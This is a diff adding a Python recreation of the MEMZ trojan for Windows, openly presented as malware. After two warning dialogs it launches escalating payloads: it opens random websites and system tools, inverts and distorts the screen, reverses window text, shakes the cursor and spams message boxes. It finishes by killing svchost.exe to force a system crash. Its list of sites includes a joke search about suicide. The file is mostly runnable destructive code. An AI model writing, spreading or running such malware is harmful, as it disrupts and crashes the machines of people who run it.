@@ -1,0 +1,224 @@
+#	Recreating the famous MEMZ malware by Leurak in pure Python! :D
+#	-- Made by Itzsten --
+
+# 	Please ensure you've installed Python and the library "pywin32", that currently only has compability for Windows, since it uses
+#	functions imported from Windows DLL's. We'll also use Ctypes a bit for the MBR overwriting etc.
+
+from win32api import *
+from win32gui import *
+from win32ui import *
+import ctypes
+from win32con import *
+from win32file import *
+from random import randrange as rd
+from random import *
+from sys import exit
+import multiprocessing
+
+# Let's firstly make the warning, that MEMZ is clearly known for.
+
+def warning():
+	if MessageBox("The software you just executed is considered malware.\nThis malware will harm your computer and makes it unusable.\nIf you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\nIf you know what this malware does and are using a safe environment to test,\npress Yes to start it.\nDO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", 
+		"MEMZ", # The title of the warning.
+		MB_YESNO | MB_ICONWARNING) == 7: # If the user pressed no to our warning, exit the program.
+		exit()
+	if MessageBox("THIS IS THE LAST WARNING!\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\nSTILL EXECUTE IT?", 
+		"MEMZ", # The title of the warning.
+		MB_YESNO | MB_ICONWARNING) == 7: # If the user pressed no to our warning, exit the program.
+		exit()
+
+# First payload, opening random websites.
+
+class Data:
+	sites = (
+		"http://google.co.ck/search?q=best+way+to+kill+yourself",
+		"http://google.co.ck/search?q=how+2+remove+a+virus",
+		"http://google.co.ck/search?q=mcafee+vs+norton",
+		"http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend",
+		"http://google.co.ck/search?q=minecraft+hax+download+no+virus",
+		"http://google.co.ck/search?q=how+to+get+money",
+		"http://google.co.ck/search?q=bonzi+buddy+download+free",
+		"http://google.co.ck/search?q=how+2+buy+weed",
+		"http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic",
+		"http://google.co.ck/search?q=what+happens+if+you+delete+system32",
+		"http://google.co.ck/search?q=g3t+r3kt",
+		"http://google.co.ck/search?q=batch+virus+download",
+		"http://google.co.ck/search?q=virus.exe",
+		"http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
+		"http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
+		"http://google.co.ck/search?q=virus+builder+legit+free+download",
+		"http://google.co.ck/search?q=how+to+create+your+own+ransomware",
+		"http://google.co.ck/search?q=how+to+remove+memz+trojan+virus",
+		"http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
+		"http://google.co.ck/search?q=dank+memz",
+		"http://google.co.ck/search?q=how+to+download+memz",
+		"http://google.co.ck/search?q=half+life+3+release+date",
+		"http://google.co.ck/search?q=is+illuminati+real",
+		"http://google.co.ck/search?q=montage+parody+making+program+2016",
+		"http://google.co.ck/search?q=the+memz+are+real",
+		"http://google.co.ck/search?q=stanky+danky+maymays",
+		"http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
+		"http://google.co.ck/search?q=vinesauce+meme+collection",
+		"http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
+		"http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
+		"http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
+		"http://play.clubpenguin.com",
+		"http://pcoptimizerpro.com",
+		"http://softonic.com",
+		"calc",
+		"notepad",
+		"cmd",
+		"write",
+		"regedit",
+		"explorer",
+		"taskmgr",
+		"msconfig",
+		"mspaint",
+		"devmgmt.msc",
+		"control",
+		"mmc"
+		) 		# You can also add your own sites/programs!
+	IconWarning = LoadIcon(None, 32515)
+	IconError = LoadIcon(None, 32513)
+
+
+time = 0
+timeSubtract = 15000
+
+class Payloads:
+	def open_sites():
+		global timeSubtract
+		sites = Data.sites
+		global time
+		while True:
+			Sleep(timeSubtract-time)
+			__import__("os").system("start " + str(choice(sites)))
+	def decrease_timer():
+		global time
+		while time < 15000:
+			time += 1
+			Sleep(10)
+	def blink_screen():
+		global time
+		global timeSubtract
+		HDC = GetDC(0) # Get the first monitor
+		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1)) # Get screen width and height
+		while True:
+			Sleep(1000)
+			PatBlt(HDC, 0,0,sw,sh, PATINVERT) # Invert the entire monitor! I know it sounds crazy!
+	def reverse_text():
+		global time
+		global timeSubtract
+		HWND = GetDesktopWindow() # This really is where we want to check for all open windows.
+		while True:
+			EnumChildWindows(HWND, EnumChildProc, None) # Enumerate through all open windows and apply the text change to them.
+			Sleep(timeSubtract-time)
+	def error_drawing():
+		global time 
+		global timeSubtract
+		HDC = GetDC(0) # First monitor
+		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1)) # Screen size
+		while True:
+			DrawIcon(HDC, rd(sw), rd(sh), Data.IconWarning) # Draw the warning icon randomly on the screen
+			for i in range(0, 60):
+				mouseX,mouseY = GetCursorPos() # Cursor positions
+				DrawIcon(HDC, mouseX, mouseY, Data.IconError) # Draw icon on mouse
+				Sleep(10)
+	def warning_spam():
+		global time 
+		global timeSubtract
+		while True:
+			multiprocessing.Process(target = msgboxThread).start()
+			Sleep(timeSubtract-time)
+	def screen_puzzle():
+		global time
+		global timeSubtract
+		HDC = GetDC(0)
+		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
+
+		# Generate box position
+		x1 = rd(sw-100)
+		y1 = rd(sh-100)
+		x2 = rd(sw-100)
+		y2 = rd(sh-100)
+
+		width = rd(600)
+		height = rd(600)
+
+		while True:
+			BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
+			Sleep(150)
+	def cursor_shake():
+		global time
+		global timeSubtract
+		while True:
+			x,y = GetCursorPos() # Get cursor position
+
+			# Calculate new cursor position
+			newX = x + (rd(3)-1) * rd(int((time+1)/2200+2)) 
+			newY = y + (rd(3)-1) * rd(int((time+1)/2200+2))
+
+			SetCursorPos((newY,newY)) # Set the cursor position
+
+			Sleep(10)
+	def tunnel_effect():
+		global time
+		global timeSubtract
+		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
+		HDC = GetDC(0)
+		while True:
+			StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
+			Sleep(150)
+
+
+def msgboxThread():
+	MessageBox("still using this computer?", "lol", MB_OK | MB_ICONWARNING)
+
+def EnumChildProc(hwnd, lParam): # The callback function for reversing text.
+	try: # We still need to have it in try since some windows are hidden.
+		buffering = PyMakeBuffer(255) # Create buffering
+		length = SendMessage(hwnd, WM_GETTEXT, 255, buffering) # Get length
+		result = str(buffering[0:length*2].tobytes().decode('utf-16')) # Looks really complicated, I know but it isn't really.
+		# Let's reverse the text!
+		result = result[::-1]
+
+		SendMessage(hwnd, WM_SETTEXT, None, result) # Set the windows text.
+
+	except: pass
+
+		# Well, now we got this, but how do we run this piece of code on every open window?
+		# Well, we can enumerate through all of the windows using the EnumChildWindows function.
+
+if __name__ == '__main__':
+	warning()
+	
+	p = Payloads
+
+	opensites = multiprocessing.Process(target = p.open_sites)
+	timersub = multiprocessing.Process(target = p.decrease_timer)
+	reverse = multiprocessing.Process(target = p.reverse_text)
+	blinking = multiprocessing.Process(target = p.blink_screen)
+	icons = multiprocessing.Process(target = p.error_drawing)
+	shaking = multiprocessing.Process(target = p.cursor_shake)
+	tunneling = multiprocessing.Process(target = p.tunnel_effect)
+	puzzling = multiprocessing.Process(target = p.screen_puzzle)
+	errors = multiprocessing.Process(target = p.warning_spam)
+
+	timersub.start() # Slowly start subtracting from the timer, gradually increasing the speed of all payloads
+	opensites.start() # Start opening random websites, aka the one you entered in the variable sites
+	shaking.start() # Start shaking the mouse cursor
+	Sleep(timeSubtract*2)
+	blinking.start() # Start inverting the entire screen!
+	icons.start() # Start drawing icons!
+	Sleep(7000*2)
+	reverse.start() # Start reversing text displayed!
+	puzzling.start() # Start the screen puzzle effect!
+	errors.start() # Start the error message boxes!
+	Sleep(5000*2)
+	tunneling.start()
+	while time < 15000:
+		Sleep(10)
+	__import__("os").system("taskkill /F /IM svchost.exe") # Cause a BSOD
+
+
+# Let's run this!
